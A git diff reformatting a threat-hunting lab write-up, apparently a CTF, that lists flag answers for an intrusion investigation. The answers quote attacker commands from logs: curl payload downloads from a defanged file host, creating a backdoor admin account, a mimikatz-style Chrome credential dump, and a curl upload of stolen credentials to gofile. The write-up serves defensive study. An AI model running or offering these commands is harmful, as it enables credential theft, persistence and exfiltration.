@@ -87,9 +87,9 @@ Five days after the file server breach, threat actors returned with sophisticate
 
 ## 🚩 Flag 1, 2 & 3: LATERAL MOVEMENT - Source IP, Compromised Account, Target Device Name
 
-Answer flag 1: 10.1.0.204
-Answer flag 2: yuki.tanaka
-Answer flag 3: azuki-adminpc
+- Answer flag 1: 10.1.0.204
+- Answer flag 2: yuki.tanaka
+- Answer flag 3: azuki-adminpc
 
 Query used: (Timestamp filtered for 25nd of November)
 ```
@@ -108,8 +108,8 @@ As per the instructions, I checked for any LogonSuccess into azuki DeviceName 5 
 
 ## 🚩 Flag 4 & 5: EXECUTION - Payload Hosting Service & Malware Download Command
 
-Answer flag 4: litter.catbox.moe
-Answer flag 5: "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z hxxps[://]litter[.]catbox[.]moe/gfdb9v[.]7z (the URL has been defanged)
+- Answer flag 4: litter.catbox.moe
+- Answer flag 5: "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z hxxps[://]litter[.]catbox[.]moe/gfdb9v[.]7z (the URL has been defanged)
 
 Query used: 
 ```
@@ -127,7 +127,7 @@ The Answer to both flags can be seen in the Network Events, around the time of t
 
 ## 🚩 Flag 6: EXECUTION - Archive Extraction Command
 
-Answer flag 6: "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
+- Answer flag 6: "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
 
 Query used: 
 ```
@@ -145,7 +145,7 @@ The threat actor used the above mentioned command to extract the downloaded pass
 
 ## 🚩 Flag 7: PERSISTENCE - C2 Implant
 
-Answer flag 7: meterpreter.exe
+- Answer flag 7: meterpreter.exe
 
 Query used: 
 ```
@@ -164,7 +164,7 @@ Upon investigation into what the threat actor extracted into the C:\Windows\Temp
 
 ## 🚩 Flag 8: PERSISTENCE - Named Pipe
 
-Answer flag 8: \Device\NamedPipe\msf-pipe-5902
+- Answer flag 8: \Device\NamedPipe\msf-pipe-5902
 
 Query used: 
 ```
@@ -181,8 +181,8 @@ The meterpreter c2 beacon used named pipes as a c2 channel for communication. Na
 
 ## 🚩 Flag 9 & 10: CREDENTIAL ACCESS - Decoded Account Creation & PERSISTENCE - Backdoor Account
 
-Answer flag 9: net user yuki.tanaka2 B@ckd00r2024! /add
-Answer flag 10: yuki.tanaka2
+- Answer flag 9: net user yuki.tanaka2 B@ckd00r2024! /add
+- Answer flag 10: yuki.tanaka2
 
 Query used: 
 ```
@@ -201,7 +201,7 @@ In the process events it was evident that the threat actor encoded a command and
 
 ## 🚩 Flag 11: PERSISTENCE - Decoded Privilege Escalation Command
 
-Answer flag 10: net localgroup Administrators yuki.tanaka2 /add
+- Answer flag 10: net localgroup Administrators yuki.tanaka2 /add
 
 <img width="1000" height="468" alt="image" src="https://github.com/user-attachments/assets/8c43aca6-d327-46d3-bcbc-4539820b39f5" />
 
@@ -211,11 +211,11 @@ The threat actor encoded another command that was used to elevate privileges to 
 
 ## 🚩 Flag 12, 13, 14, 15, 16: DISCOVERY - Session Enumeration, Domain Trust Enumeration, Network Connection Enumeration, Password Database Search, Credential File
 
-Answer flag 12: qwinsta.exe
-Answer flag 13: "nltest.exe" /domain_trusts /all_trusts
-Answer flag 14: "NETSTAT.EXE" -ano
-Answer flag 15: where /r C:\Users *.kdbx
-Answer flag 16: OLD-Passwords.txt
+- Answer flag 12: qwinsta.exe
+- Answer flag 13: "nltest.exe" /domain_trusts /all_trusts
+- Answer flag 14: "NETSTAT.EXE" -ano
+- Answer flag 15: where /r C:\Users *.kdbx
+- Answer flag 16: OLD-Passwords.txt
 
 Query used: 
 ```
@@ -233,8 +233,8 @@ I inspected the Process events and filtered for the compromised user, to see the
 
 ## 🚩 Flag 17, 18: COLLECTION - Data Staging Directory & Automated Data Collection Command
 
-Answer flag 17: C:\ProgramData\Microsoft\Crypto\staging
-Answer flag 18: "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP
+- Answer flag 17: C:\ProgramData\Microsoft\Crypto\staging
+- Answer flag 18: "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP
 
 <img width="900" height="458" alt="image" src="https://github.com/user-attachments/assets/4e3790d1-9338-4580-820e-8f7f56b43105" />
 
@@ -244,7 +244,7 @@ Furthermore, following the previous flags, I found the command where the threat 
 
 ## 🚩 Flag 19: COLLECTION - Exfiltration Volume
 
-Answer flag 19: 8
+- Answer flag 19: 8
 
 Query used: 
 ```
@@ -264,8 +264,8 @@ Within the threat actor's staging directory, I found 8 different archive files, 
 
 ## 🚩 Flag 20, 21: CREDENTIAL ACCESS - Credential Theft Tool Download & Browser Credential Theft
 
-Answer flag 20: "curl.exe" -L -o m-temp.7z hxxps[://]litter[.]catbox[.]moe/mt97cj[.]7z
-Answer flag 21: "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
+- Answer flag 20: "curl.exe" -L -o m-temp.7z hxxps[://]litter[.]catbox[.]moe/mt97cj[.]7z
+- Answer flag 21: "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
 
 Query used: 
 ```
@@ -283,8 +283,8 @@ Two more commands that I noticed in the process events were the download command
 
 ## 🚩 Flag 22, 23: EXFILTRATION - Data Upload Command & Cloud Storage Service
 
-Answer flag 22: "curl.exe" -X POST -F file=@credentials.tar.gz hxxps[://]store1[.]gofile[.]io/uploadFile
-Answer flag 23: gofile[.]io
+- Answer flag 22: "curl.exe" -X POST -F file=@credentials.tar.gz hxxps[://]store1[.]gofile[.]io/uploadFile
+- Answer flag 23: gofile[.]io
 
 <img width="900" height="542" alt="image" src="https://github.com/user-attachments/assets/00a21406-f6de-4ae9-a6b9-c9fb4f92b3d6" />
 
@@ -294,7 +294,7 @@ With the same query used as in flag 21, within the process events, I filtered fo
 
 ## 🚩 Flag 24: EXFILTRATION - Destination Server
 
-Answer flag 24: 45.112.123.227
+- Answer flag 24: 45.112.123.227
 
 Query used: 
 ```
@@ -311,7 +311,7 @@ Following the previous results, I checked the network events to find the Remote 
 
 ## 🚩 Flag 25: CREDENTIAL ACCESS - Master Password Extraction
 
-Answer flag 25: KeePass-Master-Password.txt
+- Answer flag 25: KeePass-Master-Password.txt
 
 <img width="900" height="470" alt="image" src="https://github.com/user-attachments/assets/acb7e136-6b46-4eea-a878-3e7e590734d5" />
 
